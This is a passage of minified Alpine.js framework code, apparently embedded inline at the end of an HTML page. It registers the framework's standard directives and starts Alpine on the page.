i=n(e);r(()=>{i(o=>{m(()=>{t.innerHTML=o??"",t._x_ignoreSelf=!0,S(t),delete t._x_ignoreSelf})})})});ot(Nt(":",Pt(O("bind:"))));var Nn=(t,{value:e,modifiers:r,expression:n,original:i},{effect:o,cleanup:s})=>{if(!e){let c={};Qr(c),_(t,n)(u=>{Oe(t,u,i)},{scope:c});return}if(e==="key")return io(t,n);if(t._x_inlineBindings&&t._x_inlineBindings[e]&&t._x_inlineBindings[e].extract)return;let a=_(t,n);o(()=>a(c=>{c===void 0&&typeof n=="string"&&n.match(/\./)&&(c=""),m(()=>gt(t,e,c,r))})),s(()=>{t._x_undoAddedClasses&&t._x_undoAddedClasses(),t._x_undoAddedStyles&&t._x_undoAddedStyles()})};Nn.inline=(t,{value:e,modifiers:r,expression:n})=>{e&&(t._x_inlineBindings||(t._x_inlineBindings={}),t._x_inlineBindings[e]={expression:n,extract:!1})};p("bind",Nn);function io(t,e){t._x_keyExpression=e}Dt(()=>`[${O("data")}]`);p("data",(t,{expression:e},{cleanup:r})=>{if(oo(t))return;e=e===""?"{}":e;let n={};H(n,t);let i={};rn(i,n);let o=T(t,e,{scope:i});(o===void 0||o===!0)&&(o={}),H(o,t);let s=C(o);rt(s);let a=N(t,s);s.init&&T(t,s.init),r(()=>{s.destroy&&T(t,s.destroy),a()})});V((t,e)=>{t._x_dataStack&&(e._x_dataStack=t._x_dataStack,e.setAttribute("data-has-alpine-state",!0))});function oo(t){return k?Lt?!0:t.hasAttribute("data-has-alpine-state"):!1}p("show",(t,{modifiers:e,expression:r},{effect:n})=>{let i=_(t,r);t._x_doHide||(t._x_doHide=()=>{m(()=>{t.style.setProperty("display","none",e.includes("important")?"important":void 0)})}),t._x_doShow||(t._x_doShow=()=>{m(()=>{t.style.length===1&&t.style.display==="none"?t.removeAttribute("style"):t.style.removeProperty("display")})});let o=()=>{t._x_doHide(),t._x_isShown=!1},s=()=>{t._x_doShow(),t._x_isShown=!0},a=()=>setTimeout(s),c=ht(f=>f?s():o(),f=>{typeof t._x_toggleAndCascadeWithTransitions=="function"?t._x_toggleAndCascadeWithTransitions(t,f,s,o):f?a():o()}),l,u=!0;n(()=>i(f=>{!u&&f===l||(e.includes("immediate")&&(f?a():o()),c(f),l=f,u=!1)}))});p("for",(t,{expression:e},{effect:r,cleanup:n})=>{let i=co(e),o=_(t,i.items),s=_(t,t._x_keyExpression||"index");t._x_lookup=new Map,r(()=>ao(t,i,o,s)),n(()=>{t._x_lookup.forEach(a=>m(()=>{I(a),a.remove()})),delete t._x_lookup})});function so(t){return e=>{Object.entries(e).forEach(([r,n])=>{t[r]=n})}}function ao(t,e,r,n){r(i=>{uo(i)&&(i=Array.from({length:i},(l,u)=>u+1)),i==null&&(i=[]),i instanceof Set&&(i=Array.from(i)),i instanceof Map&&(i=Array.from(i));let o=t._x_lookup,s=new Map;t._x_lookup=s;let a=fo(i),c=Object.entries(i).map(([l,u])=>{a||(l=parseInt(l));let f=lo(e,u,l,i),b;return n(g=>{typeof g=="object"&&E("x-for key cannot be an object, it must be a string or an integer",t),o.has(g)&&(s.set(g,o.get(g)),o.delete(g)),b=g},{scope:{index:l,...f}}),[b,f]});m(()=>{o.forEach(f=>{I(f),f.remove()});let l=new Set,u=t;c.forEach(([f,b])=>{if(s.has(f)){let d=s.get(f);d._x_refreshXForScope(b),u.nextElementSibling!==d&&(u.nextElementSibling&&d.replaceWith(u.nextElementSibling),u.after(d)),u=d,d._x_currentIfEl&&(d.nextElementSibling!==d._x_currentIfEl&&u.after(d._x_currentIfEl),u=d._x_currentIfEl);return}t.content.children.length>1&&E("x-for templates require a single root element, additional elements will be ignored.",t);let g=document.importNode(t.content,!0).firstElementChild,L=C(b);N(g,L,t),g._x_refreshXForScope=so(L),s.set(f,g),l.add(g),u.after(g),u=g}),v(()=>l.forEach(f=>S(f)))()})})}function co(t){let e=/,([^,\}\]]*)(?:,([^,\}\]]*))?$/,r=/^\s*\(|\)\s*$/g,n=/([\s\S]*?)\s+(?:in|of)\s+([\s\S]*)/,i=t.match(n);if(!i)return;let o={};o.items=i[2].trim();let s=i[1].replace(r,"").trim(),a=s.match(e);return a?(o.item=s.replace(e,"").trim(),o.index=a[1].trim(),a[2]&&(o.collection=a[2].trim())):o.item=s,o}function lo(t,e,r,n){let i={};return/^\[.*\]$/.test(t.item)&&Array.isArray(e)?t.item.replace("[","").replace("]","").split(",").map(s=>s.trim()).forEach((s,a)=>{i[s]=e[a]}):/^\{.*\}$/.test(t.item)&&!Array.isArray(e)&&typeof e=="object"?t.item.replace("{","").replace("}","").split(",").map(s=>s.trim()).forEach(s=>{i[s]=e[s]}):i[t.item]=e,t.index&&(i[t.index]=r),t.collection&&(i[t.collection]=n),i}function uo(t){return typeof t!="object"&&!isNaN(t)}function fo(t){return typeof t=="object"&&!Array.isArray(t)}function Pn(){}Pn.inline=(t,{expression:e},{cleanup:r})=>{let n=Y(t);n&&(n._x_refs||(n._x_refs={}),n._x_refs[e]=t,r(()=>delete n._x_refs[e]))};p("ref",Pn);p("if",(t,{expression:e},{effect:r,cleanup:n})=>{t.tagName.toLowerCase()!=="template"&&E("x-if can only be used on a <template> tag",t);let i=_(t,e),o=()=>{if(t._x_currentIfEl)return t._x_currentIfEl;let a=t.content.cloneNode(!0).firstElementChild;return N(a,{},t),m(()=>{t.after(a),v(()=>S(a))()}),t._x_currentIfEl=a,t._x_undoIf=()=>{m(()=>{I(a),a.remove()}),delete t._x_currentIfEl},a},s=()=>{t._x_undoIf&&(t._x_undoIf(),delete t._x_undoIf)};r(()=>i(a=>{a?o():s()})),n(()=>t._x_undoIf&&t._x_undoIf())});p("id",(t,{expression:e},{evaluate:r})=>{r(e).forEach(i=>vn(t,i))});V((t,e)=>{t._x_ids&&(e._x_ids=t._x_ids)});ot(Nt("@",Pt(O("on:"))));p("on",v((t,{value:e,modifiers:r,expression:n},{cleanup:i})=>{let o=n?_(t,n):()=>{};t.tagName.toLowerCase()==="template"&&(t._x_forwardEvents||(t._x_forwardEvents=[]),t._x_forwardEvents.includes(e)||t._x_forwardEvents.push(e));let s=z(t,e,r,a=>{o(()=>{},{scope:{$event:a},params:[a]})});i(()=>s())}));te("Collapse","collapse","collapse");te("Intersect","intersect","intersect");te("Focus","trap","focus");te("Mask","mask","mask");function te(t,e,r){p(e,n=>E(`You can't use [x-${e}] without first installing the "${t}" plugin here: https://alpinejs.dev/plugins/${r}`,n))}B.setEvaluator(mr);B.setRawEvaluator(_r);B.setReactivityEngine({reactive:Xt,effect:fn,release:dn,raw:h});var He=B;window.Alpine=He;queueMicrotask(()=>{He.start()});})();
    </script>
</body>

</html>
